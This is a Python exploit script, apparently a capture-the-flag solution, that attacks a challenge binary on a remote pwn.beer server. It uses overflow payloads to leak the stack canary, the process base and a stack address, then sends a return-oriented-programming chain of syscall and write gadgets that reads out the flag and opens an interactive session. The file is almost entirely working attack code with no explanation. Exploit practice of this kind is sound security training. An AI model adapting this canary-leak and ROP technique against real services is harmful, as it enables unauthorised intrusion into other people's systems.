from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./chall")
sock = Socket("blakflag-01.pwn.beer", 45243)

def set_rax(val):
    payload  = p64(rop_pop_rdx_rdi_rsi)
    payload += p64(val)
    payload += p64(1)
    payload += p64(proc_base)
    payload += p64(rop_write)
    return payload

# leak canary and proc base
payload = b'A' * 0x98
sock.sendlineafter(": ", payload)
sock.recvline()
canary = u64(b'\x00' + sock.recv(7))
proc_base = u64(sock.recvline()) - 0xf1e
logger.info("canary = " + hex(canary))
logger.info("proc base = " + hex(proc_base))
addr_pflag = proc_base + 0x203000

# leak stack address
payload = b'A' * (0xd0 - 1)
sock.sendlineafter(": ", payload)
sock.recvline()
stack_addr = u64(sock.recvline()) - 0x452
logger.info("stack addr = " + hex(stack_addr))

# prepare rop gadget
rop_pop_rsi = proc_base + 0x00000f95
rop_pop_rdi_rsi = proc_base + 0x00000f94
rop_pop_rdx_rdi_rsi = proc_base + 0x00000f93
rop_syscall = proc_base + 0x00000f50
rop_write = proc_base + 0xf53
logger.info("break *" + hex(proc_base + 0xf1d))

# crop
payload  = b'A' * 8
#_ = input()
payload += (p64(proc_base + 0x203000) + p64(0x400)) * 9
payload += p64(canary)
payload += p64(0)
for i in range(0x10):
    payload += set_rax(19)
    payload += p64(rop_pop_rdx_rdi_rsi)
    payload += p64(1)
    payload += p64(3)
    payload += p64(stack_addr - 0x100 * i)
    payload += p64(rop_syscall)
    payload += p64(rop_pop_rdx_rdi_rsi)
    payload += p64(0x80)
    payload += p64(1)
    payload += p64(proc_base + 0x203000)
    payload += p64(rop_write)

sock.sendlineafter(": ", payload)

sock.interactive()
